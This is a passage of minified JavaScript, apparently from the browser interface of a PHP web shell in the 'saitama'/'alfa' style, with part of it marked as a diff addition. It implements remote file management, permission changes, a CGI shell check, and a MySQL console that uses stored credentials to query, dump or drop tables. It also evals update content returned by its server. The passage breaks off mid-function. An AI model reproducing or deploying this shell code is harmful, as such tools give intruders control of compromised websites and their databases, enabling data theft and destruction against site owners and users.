t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function saitamaCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(saitama_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function saitamaFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),saitamaSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){saitamaFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;saitamaRightClickMenu(y,_),e.preventDefault()})})}function saitamaFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=saitamaGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="saitamaFilesmanTabShowTitle(this,event);" onmouseout="saitamaFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),saitama_fm_id=o,g("FilesMan",l),saitama_fm_id=0}function saitamaFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function saitamaFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function saitamaPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+saitama_current_fm_id;saitamaloader(o,"block"),data="a="+saitamab64(e)+"&c="+saitamab64(t)+"&saitama1="+saitamab64(a)+"&saitama2="+saitamab64(i)+"&saitama3="+saitamab64(l)+"&ajax="+saitamab64("true"),_Ajax(d.URL,data,r,!1,o)}function saitamaPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),saitamaShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else saitamaShowNotification("error...!","Rename Action","error");saitamaloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){saitamaloader(t,"none"),saitamaShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,saitamaShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else saitamaShowNotification(t,"Modify Action","error");saitamaloader(a,"none")})}}function saitamaInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+saitamab64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("saitama-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("saitama_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.saitama_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+saitamab64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+saitamab64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&saitamaCheckUrlHash()},saitamaCheckUrlHash(),saitamagetFlags(),rightclick_menu_context=$("rightclick_menu").style,saitamaInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){saitamaInitSoratableTab($("filesman_tabs_child")),saitamaInitSoratableTab(d.querySelector(".editor-tabs")),saitamaInitSoratableTab(d.querySelector(".options_tab")),saitamaInitSoratableTab(d.querySelector(".terminal-tabs")),saitamaInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
+function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:alfab64("Sql_manager_api"),c_:alfab64(c_),alfa1:alfab64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("alfa2")&&"load_data"!=e.post.alfa2&&"page"!=e.post.alfa2&&"edit"!=e.post.alfa2&&"delete"!=e.post.alfa2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=alfab64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";alfaloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){alfaloader(e.db_id,"none"),t(a)},!0,e.db_id)}function alfaMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function alfaMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;alfaMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{alfa2:"load_all_tables",alfa3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);alfaMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)alfaMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)alfaMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function alfaMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function alfaMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?alfaMysqlTableMode(a,t):alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{alfa2:"load_tables",alfa3:i}},function(e){0!=e.length&&alfaMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function alfaMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function alfaMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function alfaMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{alfa2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?alfaMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function alfaMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"alfaLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function alfaMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{alfa2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function alfaMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function alfaMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function alfaMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function alfaLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{alfa2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=alfaMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='alfaMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",alfaMysqlReportBuilder(i,e)}})}function alfaMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{alfa2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function alfaMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{alfa2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{alfa2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,alfaMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function alfaMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function alfaMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;alfaMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{alfa2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function alfaMysqlUpdateRow(e,t){var 